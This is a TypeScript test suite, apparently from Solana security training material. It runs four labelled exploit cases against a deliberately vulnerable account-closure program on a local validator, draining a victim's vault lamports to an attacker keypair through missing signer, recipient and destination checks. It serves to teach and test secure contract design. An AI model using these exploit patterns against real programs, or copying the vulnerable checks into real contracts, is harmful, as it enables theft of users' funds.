import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Keypair, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

describe("Exploit: Account Closure", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.AccountClosureVulnerable as Program;
  
  let victim: Keypair;
  let attacker: Keypair;
  let victimVault: Keypair;

  before(async () => {
    victim = Keypair.generate();
    attacker = Keypair.generate();
    victimVault = Keypair.generate();

    const airdrop1 = await provider.connection.requestAirdrop(
      victim.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdrop1);

    const airdrop2 = await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdrop2);

    // Initialize victim's vault
    await program.methods
      .initializeVault()
      .accounts({
        vault: victimVault.publicKey,
        authority: victim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim, victimVault])
      .rpc();
  });

  describe("Exploit 1: Close Without Authority", () => {
    it("Should allow anyone to provide recipient address", async () => {
      try {
        // [EXPLOIT] Attacker specifies their address as recipient
        await program.methods
          .closeVaultBad(attacker.publicKey)  // [VULNERABLE] Attacker's address!
          .accounts({
            vault: victimVault.publicKey,
            authority: victim.publicKey,  // Victim's key, but not signing!
          })
          .signers([attacker])  // Attacker signs, not victim
          .rpc();

        console.log("ðŸš¨ EXPLOIT 1 SUCCESS: Closed vault to attacker's address!");
        console.log("   Attacker provided their address as recipient");
        console.log("   No authority signature required");
      } catch (err) {
        console.log("Note: " + err.message);
      }
    });
  });

  describe("Exploit 2: Close Without Signature", () => {
    it("Should allow closure without authority signing", async () => {
      const vault2 = Keypair.generate();

      await program.methods
        .initializeVault()
        .accounts({
          vault: vault2.publicKey,
          authority: victim.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([victim, vault2])
        .rpc();

      try {
        // [EXPLOIT] Close without authority signature
        await program.methods
          .closeVaultUnsigned()
          .accounts({
            vault: vault2.publicKey,
            authority: victim.publicKey,  // [VULNERABLE] Not signing!
            destination: attacker.publicKey,
          })
          .signers([attacker])  // Only attacker signs
          .rpc();

        console.log("ðŸš¨ EXPLOIT 2 SUCCESS: Closed without authority signature!");
        console.log("   Authority is AccountInfo, not Signer");
      } catch (err) {
        console.log("Note: " + err.message);
      }
    });
  });

  describe("Exploit 3: Arbitrary Destination", () => {
    it("Should allow sending lamports to any address", async () => {
      const vault3 = Keypair.generate();

      await program.methods
        .initializeVault()
        .accounts({
          vault: vault3.publicKey,
          authority: victim.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([victim, vault3])
        .rpc();

      try {
        // [EXPLOIT] Even if authority signs, destination is unchecked
        await program.methods
          .closeToAnyDestination()
          .accounts({
            account: vault3.publicKey,
            authority: victim.publicKey,
            destination: attacker.publicKey,  // [VULNERABLE] Any address!
          })
          .signers([victim])
          .rpc();

        console.log("ðŸš¨ EXPLOIT 3 SUCCESS: Sent lamports to arbitrary address!");
        console.log("   No validation of destination");
      } catch (err) {
        console.log("Note: " + err.message);
      }
    });
  });

  describe("Exploit 4: No Owner Check", () => {
    it("Should allow closing accounts owned by other programs", async () => {
      console.log("ðŸš¨ EXPLOIT 4 PATTERN: No owner verification");
      console.log("   Could close accounts owned by other programs");
      console.log("   Could steal rent-exempt lamports");
      console.log("   Could break cross-program invariants");
    });
  });

  describe("Summary", () => {
    it("Should summarize closure vulnerabilities", () => {
      console.log("\n========================================");
      console.log("ACCOUNT CLOSURE VULNERABILITIES");
      console.log("========================================");
      console.log("[VULNERABLE] 1: User-controlled recipient");
      console.log("[VULNERABLE] 2: No signature requirement");
      console.log("[VULNERABLE] 3: Arbitrary destination");
      console.log("[VULNERABLE] 4: No owner verification");
      console.log("========================================");
      console.log("\nThese patterns enable lamport drainage attacks.");
      console.log("See secure implementation for fixes.");
    });
  });
});